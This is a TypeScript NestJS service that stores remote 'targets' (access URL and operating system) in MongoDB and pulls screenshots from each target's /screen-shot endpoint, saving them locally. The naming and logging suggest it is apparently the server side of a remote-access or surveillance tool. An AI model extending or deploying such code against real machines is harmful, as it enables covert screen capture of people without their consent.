import { Injectable } from '@nestjs/common';
import { CreateTargetDto } from './dto/create-target.dto';
import { InjectModel } from '@nestjs/mongoose';
import { Target } from './schemas/target.schema';
import { Model } from 'mongoose';
import { HttpService } from '@nestjs/axios/dist';
import * as sharp from 'sharp';
import fs from 'fs';

@Injectable()
export class TargetService {
  constructor(
    @InjectModel(Target.name) private targetModel: Model<Target>,
    private readonly httpService: HttpService,
  ) {}

  async create(createTargetDto: CreateTargetDto): Promise<Target> {
    const { access_url, os } = createTargetDto;
    const existingTarget = await this.targetModel.findOne({ access_url });
    if (!existingTarget) {
      console.log(
        `[+] New (${os}) Target with access url : ${access_url} added to DB!`,
      );
      return this.targetModel.create(createTargetDto);
    }
  }

  findTargetById(id: string): Promise<Target> {
    return this.targetModel.findById(id);
  }

  findAll(): Promise<Target[]> {
    return this.targetModel.find({});
  }

  async takeScreenshot(target: Target) {
    const { _id, access_url } = target;
    const response = await this.httpService.axiosRef.get(
      `${access_url}/screen-shot`,
      {
        responseType: 'arraybuffer',
      },
    );
    const img = response.data;
    await sharp(img).toFile(
      `./screen-shots/${Date.now()}-${_id}-screenshot.png`,
    );
    return {
      status: 'success',
      message: 'screenshot saved successfully.',
    };
  }
}
